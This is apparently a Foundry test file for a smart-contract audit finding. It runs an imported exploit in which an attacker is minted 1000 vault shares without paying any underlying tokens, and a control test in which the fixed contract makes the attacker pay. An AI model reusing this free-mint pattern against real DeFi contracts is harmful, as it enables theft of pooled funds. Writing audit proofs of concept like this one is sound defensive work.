// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Token, Island, BurveFixed} from "./55212-h-01-missing-transfer-of-tokens-before-islandmint-pashov-aud.sol";

contract Finding55212Test is Test {
    function test_exploit_shares_minted_against_empty_island() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.shares(), 1000 ether, "attacker received 1000 shares");
        assertEq(e.attackerUnderlying(), 1000 ether, "attacker paid 0");
        assertEq(e.islandUnderlying(), 0, "island underlying is 0");
        assertEq(e.emptyAtMint(), 0, "mintRange saw an empty balance");

        emit log_named_uint("HARM free shares", e.shares());
        emit log_named_uint("HARM attacker underlying left", e.attackerUnderlying());
        emit log_named_uint("HARM island underlying", e.islandUnderlying());
    }

    function test_control_transfer_first_attacker_must_pay() public {
        Token underlying = new Token();
        Island island = new Island(underlying);
        BurveFixed burve = new BurveFixed(island, underlying);

        uint256 n = 1000 ether;
        underlying.mint(address(this), n);
        underlying.approve(address(burve), n);

        burve.mint(address(this), uint128(n));

        assertEq(island.balanceOf(address(this)), n, "control still mints shares");
        assertEq(underlying.balanceOf(address(this)), 0, "attacker paid N");
        assertEq(underlying.balanceOf(address(island)), n, "island received N");
        assertEq(island.lastRangeBalance(), n, "mintRange saw the payment");

        emit log_named_uint("CONTROL paid", n);
        emit log_named_uint("CONTROL island underlying", underlying.balanceOf(address(island)));
    }
}
